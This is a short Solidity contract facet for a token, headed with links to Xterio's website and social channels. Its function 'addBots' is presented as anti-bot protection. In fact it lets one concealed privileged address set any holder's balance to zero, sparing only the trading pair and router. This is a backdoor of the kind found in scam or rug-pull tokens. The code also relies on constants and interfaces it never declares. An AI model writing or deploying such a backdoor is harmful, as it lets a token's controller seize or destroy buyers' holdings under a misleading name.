/*  
   * SPDX-License-Identifier: MIT
    ▫️Website: https://xter.io
    ▫️Twitter: https://twitter.com/XterioGames
    ▫️Discord: https://discord.gg/xteriogames
    ▫️Medium: https://medium.com/@XterioGames
*/
pragma solidity ^0.8.15;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
